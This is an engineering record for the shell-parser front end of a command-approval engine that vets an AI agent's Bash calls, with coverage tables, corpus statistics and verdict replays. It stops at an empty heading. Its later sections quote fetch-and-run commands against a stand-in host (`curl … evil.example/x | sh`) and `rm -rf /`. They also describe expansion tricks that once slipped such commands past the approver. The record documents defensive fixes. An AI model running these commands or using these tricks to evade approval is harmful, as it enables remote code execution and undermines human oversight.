# The `cmdparse` lowering seam — coverage record

Authority: `docs/adr/0039-ceta-shell-parser-front-end.md` (this repo), its Decision, Invariants and
Enforcement sections. This file is the **per-construct coverage record** ADR 0039's migration step 1
owes, plus the **corpus population** every later step MUST cite instead of re-deriving one.

The seam is `shellparse.go`. It is the only file in this Go module that may import `mvdan.cc/sh/v3`
(I6), enforced by `TestSeamIsTheOnlyParserImporter`. The shadow comparison is `shadow.go`; the
latency gate and the census are `frontend_ab_test.go`.

## Status of this step

> **SUPERSEDED — read "Step 2 — THE FLIP" below for the CURRENT state.** This section records
> step 1 (`pg2-jxmk9`) as it shipped. The seam is now AUTHORITATIVE, the shadow comparison is
> retired, and the outgoing front end described here is DELETED.

The candidate front end runs in **SHADOW**. The **outgoing** front end —
`StripCommentsPreservingHeredocs` then `Parse`, in that order — remains authoritative for every
verdict. `LogShadowDisagreement` returns nothing, so nothing in the engine can read the candidate's
result. **No behaviour change ships in this step**, and no existing test expectation was edited.

## Lowering completeness

Every construct ADR 0039 and bead `pg2-jxmk9` name, and whether it is covered or deferred.

| Construct                                | Status      | How                                                                                                                                                                                                                                             |
| ---------------------------------------- | ----------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `unwrapCommand`                          | **Covered** | REUSED verbatim. It is already `ParsedCommand -> ParsedCommand`, so the lowering builds a leaf and calls it. Reuse is what makes parity provable rather than re-argued.                                                                         |
| `unwrapExecPrefix`                       | **Covered** | Reached through `unwrapCommand`. `env`/`command` land in `CallExpr.Args`, which is where it already looks.                                                                                                                                      |
| `unwrapCommandRunner`                    | **Covered** | Reached through `unwrapCommand` (`nice`, `timeout`, `nohup`, `stdbuf`). Pinned by `TestShellParse_UnwrapReuse`, which also asserts the outgoing front end agrees.                                                                               |
| `liftAssignmentArgs`                     | **Covered** | Reached through `unwrapCommand` for the `export` branch. `export A=1 B` arrives as a `*syntax.DeclClause`, lowered to `Executable="export"` with each `Assign`'s verbatim source slice as an argument, so the existing lift applies unchanged.  |
| `NormalizeExecutable`                    | **Covered** | Pure string work on an executable; unaffected by the front end. No change.                                                                                                                                                                      |
| `NormalizeCommand`                       | **Covered** | `NormalizeCommandShell` is the same function over the seam. Both spellings are kept so the persisted hook-miss bucketing can be re-keyed deliberately rather than discovered after the fact.                                                    |
| `resolveLoops` (hole A, terminator)      | **Covered** | Structurally, and MORE generally than the text version: a redirection on a compound sits on the compound's own `*syntax.Stmt`, so `emitCompoundRedirs` covers `done > f`, `(cmd) > f`, `{ …; } > f`, `if … fi > f` and `case … esac > f` alike. |
| `resolveLoops` (hole B, word list)       | **Covered** | `WordIter.Items` lower to ONE command-less data leaf carrying only `Raw`, `PipelineID` `-1`. Replicates the POST-`pg2-qkecz` behaviour, not the pre-fix behaviour.                                                                              |
| Herestring `<<<`                         | **Covered** | `syntax.WordHdoc` sets `HasHeredoc` from the OPERATOR and records no extent and no redirection. Keying off a non-empty body would drop the I2 floor for every herestring.                                                                       |
| `unquote` parity                         | **Covered** | The token is the outgoing `unquote` applied to each word's EXACT SOURCE SLICE. A true literal expansion is deliberately NOT used: it would turn `a'b'c` into `abc` and newly clear the predicate I4 exists to fence.                            |
| Heredoc extents                          | **Covered** | Delimiter, `Quoted`, `StripTabs` and `Body` from `Redirect.Word`/`Redirect.Hdoc`. `Body` matches the outgoing `readHeredocBody` byte for byte, `<<-` included. `Terminated` is always true — an unterminated heredoc is a parse failure.        |
| Process substitution                     | **Covered** | The fabricated `/dev/fd/63` operand plus the lifted body, matching `tokenize`. Both halves are load-bearing: the source text instead causes mass new abstains, nothing at all loses the operand.                                                |
| Redirection grammar                      | **Covered** | `redirCore` maps every parser operator onto the outgoing operator TEXT, so `Operator` and the derived `Kind` are unchanged. `2>&1`, `>&-` and `<&3` are dropped as fd duplication/close.                                                        |
| Position independence (`pg2-gkd5e`)      | **Covered** | Leading assignments come from `CallExpr.Assigns`, the `env` form from `Args`. `TestShellParse_PositionIndependentAssignments` pins both reaching the same `EnvVars`, and pins that a trailing `cmd FOO=1` operand is NOT lifted.                |
| Indexed / associative assignment         | **Covered** | `BEAD_IDS[1]="x"`, `m[$k]=$(…)`. The name is not a valid identifier so it cannot become an `EnvAssignment`; it reaches a DATA leaf instead. Dropping it was a real defect the census caught — see "Defects this step found".                    |
| Pipeline relation                        | **Covered** | A `BinaryCmd` pipe chain is flattened in source order and shares one `PipelineID`. The under-approximation for a compound's LATER stages is carried over from the outgoing front end unchanged, not newly introduced.                           |
| Untaken branches (I14)                   | **Covered** | `if`/`elif`/`else`, every `case` item, and a `FuncDecl` body are all lowered. Executedness is a runtime property; the binding form is I14's static surrogate.                                                                                   |
| `ArithmCmd` / `TestClause` / `LetClause` | **Covered** | Each reaches a DATA leaf carrying its source span. None executes a command, but each can embed a live `$( )`. The outgoing front end judged them as commands (`[[`, `((`), which this stops.                                                    |
| Comment handling                         | **Retired** | `KeepComments(true)` makes a comment a parser fact, so no comment pass runs in the candidate at all. `ParsedCommand.Comment` is left empty; on the engine's path the outgoing value is ALWAYS empty too, because the engine pre-strips.         |

### Deferred, with reasons

| Item                                                  | Why deferred                                                                                                                                                                                                                                                                                                                                                                         |
| ----------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Flipping the engine to the candidate                  | **DONE — step 2, `pg2-fez3d`. See "Step 2 — THE FLIP" below.**                                                                                                                                                                                                                                                                                                                       |
| The substitution-scan family (`ScanSubstitutions`)    | **DONE — step 2a, `pg2-zeqa5`. See "Step 2a" below.**                                                                                                                                                                                                                                                                                                                                |
| Enforcement guard 3 (parse-count, I7)                 | ADR 0039's Enforcement states it MUST land AFTER the per-rule `gitdir` migration, because `gitdir` re-parses the root expression and recurses to depth 8, so the guard cannot go green before that.                                                                                                                                                                                  |
| Enforcement guard 2 (raw-text-structure, I9)          | ADR 0039 carries the mechanism as an OPEN question and assigns the decision to the per-rule migration step, which must record which mechanism it chose and why.                                                                                                                                                                                                                      |
| Enforcement guard 4 (coverage check, I14)             | **DONE — step 2, `pg2-fez3d` (`LeafCoverageGaps` + `TestLeafSpansCoverEveryCallExpr`).** Was: partially discharged: the leaf-delta accounting in `frontend_ab_test.go` runs over the whole snapshot and did catch a real dropped-leaf defect. The full span-union assertion against every `*syntax.CallExpr` is a separate check and belongs with the flip, which owns the leaf set. |
| `ParsedCommand.Raw` becoming the exact slice for real | **DONE — step 2, `pg2-fez3d`.** Was: the candidate already produces it (I12). It cannot be adopted while the outgoing front end is authoritative, because rules re-parse `Raw` and the two spellings differ on heredoc-bearing leaves.                                                                                                                                               |

### Defects this step found

- **Indexed and associative array-element assignments were DROPPED by the first draft of the
  lowering** — `BEAD_IDS[85591]="zr-8pl"` produced no leaf at all, because `isEnvAssign` rejects the
  bracketed name and nothing else claimed it. That is root cause 4 (a pass DELETING a segment) in the
  new code, and it would have looked like a tidier leaf count in a differential replay. Found by the
  corpus census's dangerous-direction dump, fixed, and pinned by
  `TestShellParse_IndexedAssignmentReachesALeaf`.

### Defects in the OUTGOING front end that the census surfaced

These are recorded because they are the largest components of the leaf delta and each will move
verdicts at the flip. None is fixed here — this step ships no behaviour change.

- **Line-continuation token debris.** `splitCompound` consumes `\`+newline as an escaped pair but
  copies BOTH bytes into the segment, so `tokenize` yields the bogus executable `"\<newline>curl"`
  and arguments like `"\<newline>-H"`. No argv[0]-keyed rule matches such a leaf.
- **Process-substitution bodies split at an inner operator.** `splitCompound` tracks no `<(` extent,
  so `diff -u <(cat x | jq .) <(cat y | jq .)` splits at the inner `|`, producing the argument
  `"<(cat"` and the bogus executable `"jq -S .)"`, with neither body lifted.
- **Multi-line array literals shredded.** `t=(\n "a"\n "b"\n)` is split on the newlines inside the
  paren group, so each element becomes a bogus executable and the assignment's value is emptied.
- **Unbalanced outer quote retained.** `git commit -m "$(cat <<'EOF' … EOF)"` keeps the leading `"`
  in the token, because `unquote` only strips a fully wrapped token and the heredoc extent pass left
  it unwrapped.

## Corpus population — the definition later steps MUST cite

Recorded once, here, per bead `pg2-jxmk9`'s acceptance criteria. Later steps cite THIS, not ADR
0039's figure. Measured 2026-08-12 against
`file:$HOME/.local/share/claude-extended-tool-approver/asks.db?immutable=1` (read-only; note
`sqlite3 -readonly` FAILS on that file with SQLite error 14, and reading a LIVE database as
`immutable=1` can transiently report "database disk image is malformed (11)" — re-run the query).

| Population                                                     | Count       | Definition                                                                            |
| -------------------------------------------------------------- | ----------- | ------------------------------------------------------------------------------------- |
| all rows                                                       | 337,781     | `tool_decisions`                                                                      |
| non-excluded rows, all tools                                   | 337,236     | `excluded=0`                                                                          |
| **non-excluded `Bash` rows**                                   | **218,089** | `excluded=0 AND tool_name='Bash'`                                                     |
| **distinct `.command` VALUES** — the parse/lowering population | **185,185** | `COUNT(DISTINCT json_extract(tool_input_json,'$.command'))`                           |
| distinct input BLOBS                                           | 198,691     | `COUNT(DISTINCT tool_input_json)` — the unit ADR 0039 reported as "distinct commands" |
| snapshot rows actually measured                                | 185,188     | the extracted JSONL, deduplicated by the harness                                      |

ADR 0039's **"189,678 distinct `command` strings" is MISLABELLED** (bead `pg2-bc8ol`): that figure
counts distinct input BLOBS, not distinct `.command` values. Its percentages are self-consistent —
only the unit is wrong. The equivalent figures above are the blob count (198,691) and the true
distinct-command count (185,185), and the corpus has grown since the ADR was written, which is why
step 1 re-measured rather than comparing against the recorded numbers.

**Replayability.** The parse, lowering and coverage checks need no working directory and run on ALL
185,188 distinct commands. The VERDICT replay cannot: measured 2026-08-12 over the 218,178
non-excluded `Bash` rows then present, **73,776 (33.81%) name a `cwd` that no longer exists** — 909
of 1,129 distinct `cwd` values — and cannot be replayed. The replayable subset is 144,402 rows
across 220 `cwd` values and MUST NOT be presented as the whole.

**Offline discipline.** A replay MUST use `setup.NewEngineForCWD` plus `EvaluateHook`, or redirect
`XDG_DATA_HOME`. `cmd_evaluate` MUST NOT be used: it opens the shared production asklog
READ-WRITE.

## Latency gate result

Same-snapshot A/B, 185,188 distinct commands, interleaved per command, 3 reps per side. The
historical figures were NOT used as a baseline — they were taken on an incomplete lowering and the
corpus has grown since.

Measured on Apple M3 Pro, darwin/arm64, PARSEABLE rows only:

| Run | outgoing mean | candidate mean | outgoing p50 | candidate p50 | outgoing p99 | candidate p99 | outgoing max | candidate max |
| --- | ------------- | -------------- | ------------ | ------------- | ------------ | ------------- | ------------ | ------------- |
| 1   | 20.707 µs     | 8.418 µs       | 10.347 µs    | 4.139 µs      | 123.139 µs   | 48.542 µs     | 28.621 ms    | 22.559 ms     |
| 2   | 13.813 µs     | 5.314 µs       | 8.097 µs     | 3.097 µs      | 87.903 µs    | 33.278 µs     | 2.654 ms     | 2.604 ms      |
| 3   | 11.722 µs     | 4.271 µs       | 7.056 µs     | 2.611 µs      | 68.125 µs    | 24.389 µs     | 1.173 ms     | 0.324 ms      |
| 4   | 14.014 µs     | 5.423 µs       | 8.028 µs     | 3.069 µs      | 88.695 µs    | 35.445 µs     | 1.603 ms     | 0.680 ms      |

Absolute figures move with machine load between runs; the RATIO does not — across four independent
runs the candidate/outgoing ratio is **mean 0.364–0.407x, p50 0.370–0.400x, p99 0.358–0.400x**, and
`max` improved in every run too.

**GATE: PASS.** ADR 0039's pass criterion is mean and p99 both NO WORSE; both are roughly 2.5x
BETTER, so the "not slower than what it replaces" conclusion the decision rests on survives
re-measurement against the COMPLETE lowering. No max-only waiver is needed.

The gate is judged on the PARSEABLE-ONLY series deliberately: the candidate returns early on a parse
failure without lowering anything, so including those rows would flatter it. The two series differ by
under 0.1% because only 63 of 185,188 rows fail to parse.

Reproduce with:

```bash
CETA_AB_SNAPSHOT=/path/to/corpus-snapshot.jsonl \
CETA_AB_REPORT=/path/to/report.txt \
  go test ./internal/cmdparse/ -run TestFrontEndAB -timeout 60m -v
```

## Disagreement census

Over the whole 185,188-command snapshot, candidate against outgoing:

| Measure                                 | Rows    | Share    |
| --------------------------------------- | ------- | -------- |
| content-identical leaf sets             | 173,096 | 93.4704% |
| content disagreements                   | 12,029  | 6.4956%  |
| candidate unparseable (I1b forfeiture)  | 63      | 0.0340%  |
| — of which the parser attributed to zsh | 6       | 0.0032%  |
| `Raw` differs on a content-matched leaf | 3,444   | 1.8597%  |
| pipeline grouping differs               | 4,883   | 2.6367%  |

`Raw` and the pipeline grouping are counted SEPARATELY from leaf content, because each changes by
design (I12 redefines `Raw`; `PipelineID` is a per-call sequence that necessarily renumbers wherever
the leaf set differs). Folding them into one "differs" bit would bury the changes that are NOT by
design.

The 63 unparseable rows are I1b forfeitures: no leaf is examined, so any `Reject` a leaf would have
earned is given up. That is a movement in the more permissive direction on
`Approve < Abstain < Ask < Reject` even though it never reaches approve, and it is why the replay
gate is worded as "no transition in the less-restrictive direction" rather than "toward approve".

## The leaf-count delta, accounted for row by row

ADR 0039's Enforcement FORBIDS blanket annotation — three beads in this chain shipped on a blanket
plan and were wrong each time. So every disagreeing row is assigned a cause by a MECHANICAL
predicate over its leaf sets, the per-cause deltas are asserted to SUM EXACTLY to the snapshot
delta (the harness fails the test otherwise), and whatever no predicate claims is DUMPED VERBATIM
with both leaf sets rather than absorbed into an "other" bucket.

Snapshot leaf totals: outgoing **863,721**, candidate **854,694**, delta **−9,027 (−1.05%)**. ADR
0039 recorded −1.22% (818,475 against 828,620) on the smaller corpus; the direction and magnitude
reproduce.

| Cause                                                                         | Rows       | Leaf delta |
| ----------------------------------------------------------------------------- | ---------- | ---------- |
| outgoing line-continuation token debris removed (backslash-newline)           | 3,784      | −694       |
| same executables, argument tokenisation differs (quoting/expansion)           | 3,691      | −1         |
| keyword pseudo-leaves removed; real commands in branches/bodies judged (I14)  | 3,588      | −7,234     |
| outgoing token retained an unbalanced outer quote (heredoc in a substitution) | 374        | **+308**   |
| outgoing kept bash's `!` negation as an operand of a keyword pseudo-leaf      | 149        | −1         |
| outgoing process-substitution body split at an operator inside it             | 123        | −344       |
| candidate unparseable (I1b forfeiture)                                        | 63         | −468       |
| keyword pseudo-leaves removed; surrounding leaf set re-derived                | 48         | −143       |
| keyword pseudo-leaves removed; data leaf added (word list/case/test)          | 46         | −63        |
| outgoing shell-keyword pseudo-leaves removed                                  | 45         | −74        |
| outgoing multi-line array literal shredded into bogus executables             | 30         | −296       |
| UNCLASSIFIED — all 151 dumped verbatim in the report                          | 151        | −17        |
| **TOTAL**                                                                     | **12,092** | **−9,027** |

Reading of the table:

- **The delta is dominated by ONE cause.** −7,234 of −9,027 (80.1%) is the outgoing front end's
  shell-keyword pseudo-leaves disappearing while the real commands inside those compounds start being
  judged. A leaf whose executable is `if`, `then`, `fi`, `do` or `done` is not a command; removing it
  and judging the branch contents instead is the point of the migration, not a loss.
- **One cause moves the count UP.** +308 leaves on 374 rows, where the outgoing front end swallowed a
  following command into a token that kept an unbalanced outer quote. Those are commands that were
  never judged at all.
- **The DANGEROUS direction is EMPTY.** The harness has a dedicated cause for "an outgoing leaf the
  candidate does not produce, with no keyword, continuation, process-substitution or quote
  explanation", and dumps every such row in full because it is the only class that could LOSE a
  judgement. It found 5 rows on the first run — all of them the indexed-assignment defect recorded
  above — and **zero** after that defect was fixed.
- **151 rows (0.08% of the snapshot, 0.19% of the delta) remain unattributed** and are dumped
  verbatim with both leaf sets. They are not annotated, blanket or otherwise; the flip step must
  read them.

---

# Step 2a — the substitution-scan family, migrated (`pg2-zeqa5`)

Authority: ADR 0039's Decision, Invariants (I1a, I1b, I6, I7, I8) and Enforcement. Base
`b62f02bb`. This section is the record ADR 0039's Enforcement item "Differential replay" requires
of every migration step.

## What moved

| Symbol                           | Outcome     | Where it went                                                                                                                                             |
| -------------------------------- | ----------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `scanSubstitutions`              | **deleted** | The shared `quotesAreSyntax` byte loop. Replaced by two parser ENTRY POINTS, so the two expansion models can no longer drift.                             |
| `indexUnescapedBacktick`         | **deleted** | An inventory instance in its OWN right: not quote-aware AT ALL by its own comment, and its caller `IsSafeSubstitutionBody` is on the `pg2-wguam` P0 path. |
| `matchParen`                     | **shimmed** | Kept VERBATIM in `parser.go` for `classifyCmdSubstitution` / `classifyBacktickSubstitution` only. Owned by `pg2-x9452` (step 5).                          |
| `ScanSubstitutions`              | migrated    | `shellparse.go`, `syntax.Parser.Parse` + a top-level AST walk.                                                                                            |
| `ScanSubstitutionsInHeredocBody` | migrated    | `shellparse.go`, `syntax.Parser.Document` — the parser's OWN here-document model.                                                                         |
| `EnumerateSubstitutions`         | migrated    | Unchanged facade over `ScanSubstitutions`.                                                                                                                |
| `IsSafeSubstitutionBody`         | migrated    | One parse via `soleSimpleCommandLeaf`, replacing `ScanSubstitutions`-then-`Parse`.                                                                        |

Rule-side callers reach the seam unchanged (`gitdir.go` ×2, `envvars.go`, and `ssh.go`, which the
bead's caller list omitted). Engine-side `IsSafeSubstitutionBody` inside `foldSubstitutionScan` is
migrated with it.

**Three THIN SHIMS remain, named so their owners can assert removal:** `matchParen` (step 5,
`pg2-x9452`), and the two engine TEXT hops `evaluateHeredocBodies` and `evaluateSubstitutionsIn`
(step 4, `pg2-1019a`). Steps 4 and 5 are NOT absorbed.

## I1a is preserved as a FOLD

`foldSubstitutionScan` and `unparseableSubstitutionFloor` are **byte-identical** to `b62f02bb`
(md5 of code lines with comments stripped). `Unparseable` still folds through `MostRestrictive`,
never an early return, so the verdict stays order-independent.

## The forced semantic change, and why it did NOT materialise as a forfeiture

ADR 0039 anticipates that the local per-scan unparseable signal has no AST analogue and collapses
into I1b, forfeiting a sibling `Reject`. **In this step it does not**, because the fold is retained
AND the prefix is retained. A strict parse yields no tree, so the naive migration would return zero
bodies where the byte loop returned the prefix it had already found. Instead a FAILING text is
re-parsed with `syntax.RecoverErrors` purely to salvage that prefix, and any substitution whose
closer reports `Pos.IsRecovered` is dropped because its extent is unknown — the `pg2-wguam` rule in
AST terms. `Unparseable` stays set regardless, so recovery never becomes the fallback parser I8
forbids.

The shape that makes this load-bearing is the engine's own heredoc-bearing leaf `Raw`, which is
post-heredoc-strip and therefore ends at an unclosed here-document: `cmd $(rm -rf /) <<EOF` does not
parse, yet the command-line `$( )` is real and must still be recursed. Pinned by
`TestScanSubstitutions_UnparseableStillEnumeratesItsPrefix`.

Cost: the failure path parses twice. Only 63 of 185,188 rows fail to parse (0.034%), and I7's
parse-count guard is deferred to after the `gitdir` migration, which owns that accounting.

## Verdict replay

Corpus population per this file's "Corpus population" section; re-measured on a `VACUUM INTO`
snapshot taken 2026-08-12 read-only via `immutable=1`: 338,424 rows, 218,567 non-excluded `Bash`,
185,657 distinct `.command` values (the recorded 185,185 has grown).

**Replayed:** 130,511 distinct `(command, cwd)` pairs, offline through `setup.NewEngineForCWD` +
`EvaluateHook` with a redirected `XDG_DATA_HOME`. `cmd_evaluate` was NOT used.

**Skipped and NOT presented as the whole:** 73,789 of 218,567 non-excluded `Bash` rows (**33.76%**,
915 of 1,138 distinct `cwd` values) name a working directory that no longer exists.

| base -> new        | rows   | direction            |
| ------------------ | ------ | -------------------- |
| approve -> approve | 94,896 | same                 |
| abstain -> abstain | 32,722 | same                 |
| ask -> ask         | 2,455  | same                 |
| reject -> reject   | 413    | same                 |
| approve -> abstain | 23     | more restrictive     |
| abstain -> ask     | 1      | more restrictive     |
| reject -> ask      | 1      | **LESS restrictive** |

**GATE: PASS.** 25 transitions on 130,511 rows. Exactly ONE moves in the less-restrictive direction
under `Approve < Abstain < Ask < Reject`, and it is justified individually below. No transition
reaches `Approve` from anything.

### The one less-restrictive transition, justified individually

`cd /Users/phillipg/phillipg_mbp && bd update pg2-ia640.5 --acceptance "$(cat <<'EOF' … EOF)" …`
— base `Reject` (`primary-commit`), new `Ask` (`secrets`).

The base verdict was a **mis-parse, not a judgement**. Measured on the base tree,
`ScanSubstitutions` of that leaf's `Raw` returned **19** substitutions; **17 of them were markdown
backtick CODE SPANS in documentation prose** inside a `<<'EOF'` heredoc — a QUOTED delimiter, so
bash expands none of it. `indexUnescapedBacktick` is not quote-aware and knows nothing about heredoc
extents, so each `` `…` `` in the prose became a backtick command substitution. One of them,
`` `git commit -m "documented secrets/prod.yaml handling"` ``, was then parsed into a real
`git commit` leaf, recursed through the rule chain in a canonical clone on `main`, and rejected by
`primary-commit`. The base also truncated the one REAL substitution body by 1,703 bytes, because
`matchParen` found the wrong closing paren.

Over the seam the same text yields exactly **2** substitutions — the two real
`$(cat <<'EOF' … EOF)` — with correct extents and no phantom commands. The new `Ask` comes from
`secrets` reading the genuine prose. This is precisely ADR 0039's Enforcement item 5 permitted
exception (a step whose purpose is to stop the parser breaking benign commands), it is one row
justified on its own evidence rather than by blanket annotation, and it still PROMPTS — it does not
approve.

### The 24 more-restrictive transitions, by mechanical cause

| Cause                                                                                         | Rows |
| --------------------------------------------------------------------------------------------- | ---- |
| **A** — the unparseable-substitution floor now fires where the byte loop walked past a desync | 17   |
| **B** — a command substitution nested in arithmetic `$(( ))` is now enumerated at all         | 6    |
| **C** — `env-vars` classifies one assignment value as unsafe (`abstain -> ask`)               | 1    |

**Cause A** is I1a working as designed on inputs the byte loop silently accepted. 11 rows are
`diff <(…) <(…)` whose leaf `Raw` is a FRAGMENT the outgoing `splitCompound` cut inside a `<(`
(a defect this file already records); the byte loop's `<(` arm did `i++ // malformed <(` and reported
no desync, so a truncated fragment was certified as containing no substitutions. 2 rows are the same
family with the opening paren cut off, 3 are fragments that are not valid bash (`invalid parameter
name`), and 1 is an unmatched `<(` in a `for` body. All now prompt instead of auto-approving text
nobody modelled.

**Cause B closed a live auto-approve hole in the deployed binary.** The byte loop special-cased
arithmetic by LOOKAHEAD — on `$(` followed by `(` it jumped the index past the whole matched extent —
so it never looked inside, and a command substitution nested in arithmetic was enumerated NOWHERE.
Measured on the base tree: `echo $(( $(curl -s http://evil.example/x | sh) + 1 ))` returned **zero**
substitutions. bash performs the command substitution first and then the arithmetic, so it really
runs. Pinned by `TestScanSubstitutions_NestedInArithmeticIsEnumerated`.

## Tests

No expectation was edited. `substitution_test.go` is **+0 deletions**; every deletion in
`fuzz_test.go` and `engine.go` is a comment line. All 15 rows of
`TestScanSubstitutions_Unparseable`, all 8 of `TestScanSubstitutionsInHeredocBody_QuotesAreData` and
all of `TestIsSafeSubstitutionBody_NestedRejected` — the `pg2-wguam` regression set — pass
UNCHANGED.

`IsSafeSubstitutionBody` is deliberately TIGHTENED: its outgoing shape test was "`Parse` yields
exactly one leaf", whose quote-awareness was a side effect of `splitCompound` splitting top-level
operators. A real grammar makes that count admit `(cat VERSION)`, `{ cat VERSION; }` and
`if true; then cat VERSION; fi`, so a count-only test would newly CLEAR compound bodies. The sole
statement must now BE a `*syntax.CallExpr`. REDIRECTIONS are deliberately still judged on the
LOWERED leaf, not on `Stmt.Redirs`, because `attachRedir` drops fd duplication — rejecting on
`Stmt.Redirs` measured 5 rows of gratuitous `Approve -> Abstain` on `$(git rev-parse HEAD 2>&1)`.

**Fuzz replacement** (Enforcement item "Fuzz continuity"): `FuzzEnumerateSubstitutions` states its
replacement invariant in writing — the six properties the deleted harness asserted, plus three the
seam newly makes falsifiable (bodies strictly shorter than their source, so the engine's recursion
terminates; no parser-pool contamination between `Parse` and `Document`; recovery never clearing a
desync). 1.9M executions clean.

---

# Step 5a — the env-assignment VALUE classifier, migrated (`pg2-hed0a`)

Authority: ADR 0039's Decision, Invariants (I1b, I6, I9) and Enforcement. Base `50e9add4`. This
section is the record ADR 0039's Enforcement item "Differential replay" requires of every migration
step. It is a PARTIAL step 5: it takes the `classifyExpansion` item out of `pg2-x9452` because that
item carried a LIVE auto-approve hole, and leaves every rule-side scanner that bead names untouched.

## The hole

`classifyExpansion` decided an assignment value's kind by testing SUBSTRINGS in a fixed order —
`$((` first, then `$(`, then a backtick. A value holding an arithmetic expansion AND a command
substitution therefore short-circuited to `ExpansionArithmetic` and never reached command-substitution
classification. The env-var rule's post-recursion Ask fallback fires on `ExpansionUnknown` ALONE, so
the recursion was not bypassed — it was never entered. Measured on `50e9add4`:

| Command                                                            | base tree | fixed tree |
| ------------------------------------------------------------------ | --------- | ---------- |
| `X=$(( $(curl -s http://evil.example/x \| sh) + 1 )); echo done`   | **allow** | ask        |
| `X=$(curl -s http://evil.example/x \| sh)$((1)); echo done`        | **allow** | ask        |
| `X=$((1))$(curl -s http://evil.example/x \| sh); echo done`        | **allow** | ask        |
| `X=$(curl -s http://evil.example/x \| sh); echo done` (control)    | ask       | ask        |
| ``X=`curl -s http://evil.example/x \| sh`$((1)); echo done``       | abstain   | ask        |
| ``X=$((1))`curl -s http://evil.example/x \| sh`; echo done``       | abstain   | ask        |
| `AGENT_BEAD=$((cd ~/gt && bd list --json) \| jq -r .x); echo done` | **allow** | ask        |

bash performs the substitution BEFORE the assignment, so the inner command really runs in every row
(verified in bash 5.3.9: `X=$(printf RAN)$((1))` sets `X=RAN1`, `X=$((1))$(printf RAN)` sets
`X=1RAN`, ``X=`printf RAN`$((1))`` sets `X=RAN1`, and `Y=$((printf A) | tr A B)` sets `Y=B`). The
mask is TWO TOKENS and the substitution is untouched, which puts it in the same severity class as
`pg2-wguam` and `pg2-2u5jf`.

## What moved

| Symbol                         | Outcome     | Where it went                                                                                                                                                   |
| ------------------------------ | ----------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `classifyExpansion`            | migrated    | `shellparse.go`. One parse of the value IN ASSIGNMENT POSITION, then a CENSUS of its expansion nodes. Same name, same single caller (`newEnvAssignment`).       |
| `classifyCmdSubstitution`      | **deleted** | Its prefix/remainder "second `$`" test became the census's "a substitution beside any other expansion is Unknown".                                              |
| `classifyBacktickSubstitution` | **deleted** | Its first/last-backtick extent derivation was a SEPARATE raw-text instance; `*syntax.CmdSubst{Backquotes:true}` replaces it, so both spellings share one model. |
| `matchParen`                   | **deleted** | The last raw-text paren matcher outside the seam (I9). It had exactly one caller left after step 2a; that caller is gone.                                       |
| `HasUnsafeCommandSubstitution` | migrated    | `parser.go`, now a facade over `ScanSubstitutions` + `IsSafeSubstitutionBody`. **NO PRODUCTION CALLER** — see below.                                            |

`HasUnsafeCommandSubstitution` is SECONDARY and is recorded as such: every reference to it is a test
or the fuzz harness (`parser_test.go`, `substitution_test.go`, `fuzz_test.go`), so its `$((` lookahead
was never a live path and fixing it alone would have fixed nothing. It is fixed anyway, because the
fuzz harness asserts properties over it and an enshrined wrong invariant is worse than none. Two
inputs change: a substitution nested in arithmetic is now seen at all, and text the scan cannot model
answers `true` through the `Unparseable` branch instead of through a failed paren match.

## Blast radius, and the fail-closed argument

`ExpansionKind` has exactly three production consumers, and only two are behavioural:

- `envvars.go`'s value gate — fires on `ExpansionUnknown` alone.
- `envvars.go`'s `preservesCallerValue` — requires `ExpansionVarRef` before it can Approve.
- `shadow.go` — diagnostic formatting only.

So `Unknown` is the MOST restrictive kind and `VarRef` is the ONLY kind with an Approve path. The
classifier therefore fails closed by construction: every path that cannot produce a census (parse
error, an assignment the value does not wholly span, a substitution whose extent is not exactly
known) returns `Unknown`.

## Verdict replay

Corpus population per this file's "Corpus population" section; re-measured on a `VACUUM INTO`
snapshot taken 2026-08-12 read-only via `immutable=1`: **338,800 rows**, 338,255 non-excluded,
**218,880 non-excluded `Bash`**, **185,966 distinct `.command` values** (the recorded 185,185 has
grown again).

**SCOPING, stated because the replay is not the whole corpus.** The only changed production behaviour
is `classifyExpansion`, reachable ONLY through `newEnvAssignment`, so a command that yields no
`NAME=VALUE` assignment cannot change verdict; the other changed symbol has no production caller. The
replay is therefore scoped to commands that carry at least one assignment through the AUTHORITATIVE
front end (`Parse` ∘ `StripCommentsPreservingHeredocs` — the engine's own order, and the reason a
first census under-counted: the engine classifies the COMMENT-STRIPPED value).

**Replayed:** 14,969 distinct `(command, cwd, permission_mode)` triples, offline through
`setup.NewEngineForCWD` + `EvaluateHook` with a redirected `XDG_DATA_HOME`. `cmd_evaluate` was NOT
used.

**Skipped and NOT presented as the whole:** of 21,911 non-excluded `Bash` rows carrying an
assignment, **6,193 name a working directory that no longer exists** (6,193 / 21,911 = 28.3%).

| base -> new        | rows  | direction            |
| ------------------ | ----- | -------------------- |
| abstain -> abstain | 9,658 | same                 |
| approve -> approve | 3,446 | same                 |
| ask -> ask         | 1,704 | same                 |
| reject -> reject   | 132   | same                 |
| abstain -> ask     | 9     | more restrictive     |
| ask -> abstain     | 16    | **LESS restrictive** |
| ask -> approve     | 4     | **LESS restrictive** |

**GATE: PASS**, with 20 individually justified exceptions. 29 transitions on 14,969 rows. Every one
is attributed to a CLASSIFICATION transition by a mechanical predicate (the join of two full-corpus
value censuses); the unattributed bucket is EMPTY, which is how the comment-strip under-count above
was found rather than absorbed.

### The classification census the attribution is built on

12,741 distinct assignment values over all 185,966 distinct commands. 101 changed (101 / 12,741 =
0.79%):

| value transition   | count | direction        | cause                                                                                         |
| ------------------ | ----- | ---------------- | --------------------------------------------------------------------------------------------- |
| arith -> unknown   | 35    | more restrictive | **the hole**: a command substitution the `$((` test masked                                    |
| varref -> none     | 26    | more restrictive | a `$` the parser reads as literal; loses the `VarRef` Approve path, gains nothing             |
| varref -> unknown  | 14    | more restrictive | outgoing tokenizer debris (`${H%%`, a comment-strip fragment with an unterminated quote)      |
| unknown -> none    | 17    | **less**         | a `$(`/backtick inside single quotes or behind a backslash — bash expands none of it          |
| unknown -> varref  | 6     | **less**         | same cause, with a LIVE `${VAR}` beside the literal text                                      |
| unknown -> safecmd | 1     | **less**         | same cause, with one allowlisted `$(date …)` beside the literal text                          |
| arith -> safecmd   | 2     | neutral          | the value IS a sole safe substitution whose ARGUMENT held the `$((` (`$(tail -n $((n-b)) f)`) |

### The 20 less-restrictive transitions, justified

